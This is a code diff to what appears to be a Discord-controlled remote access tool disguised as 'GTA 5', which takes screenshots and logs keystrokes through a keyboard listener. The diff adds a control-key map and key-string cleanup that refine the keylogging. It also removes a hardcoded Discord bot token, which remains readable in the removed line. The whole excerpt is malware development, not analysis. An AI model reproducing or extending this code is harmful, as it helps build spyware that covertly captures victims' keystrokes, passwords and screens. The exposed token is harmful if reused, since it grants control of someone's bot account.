@@ -9,8 +9,9 @@ import pyautogui
 from resources.misc import *
 
 client = discord.Client(intents=discord.Intents.all())
+ctrl_codes = {'\\x01': '[CTRL+A]', '\\x02': '[CTRL+B]', '\\x03': '[CTRL+C]', '\\x04': '[CTRL+D]', '\\x05': '[CTRL+E]', '\\x06': '[CTRL+F]', '\\x07': '[CTRL+G]', '\\x08': '[CTRL+H]', '\\x09': '[CTRL+I]', '\\x0A': '[CTRL+J]', '\\x0B': '[CTRL+K]', '\\x0C': '[CTRL+L]', '\\x0D': '[CTRL+M]', '\\x0E': '[CTRL+N]', '\\x0F': '[CTRL+O]', '\\x10': '[CTRL+P]', '\\x11': '[CTRL+Q]', '\\x12': '[CTRL+R]', '\\x13': '[CTRL+S]', '\\x14': '[CTRL+T]', '\\x15': '[CTRL+U]', '\\x16': '[CTRL+V]', '\\x17': '[CTRL+W]', '\\x18': '[CTRL+X]', '\\x19': '[CTRL+Y]', '\\x1A': '[CTRL+Z]'}
 
-bot_token = 'NzQ2ODMyMjU1OTE3NDkwMTg2.X0GDvQ.6NO59zJzo9w37fKC3z8CxboE9Sk'   # Paste here BOT-token
+bot_token = ''   # Paste here BOT-token
 software_registry_name = 'GTA 5'   # ---------------------------------------------- Software name shown in registry
 software_directory_name = software_registry_name   # ------------------------------ Directory (containing software executable) located in "C:\Program Files"
 software_executable_name = software_registry_name.replace(' ', '') + '.exe'   # --- Software executable name
@@ -42,6 +43,7 @@ async def on_message(message):
         os.system('del ss.png')
 
 def on_press(key):
+    key = str(key)[1:-1] if (str(key)[0]=='\'' and str(key)[-1]=='\'') else key
     print(key)
 
 with Listener(on_press=on_press) as listener:
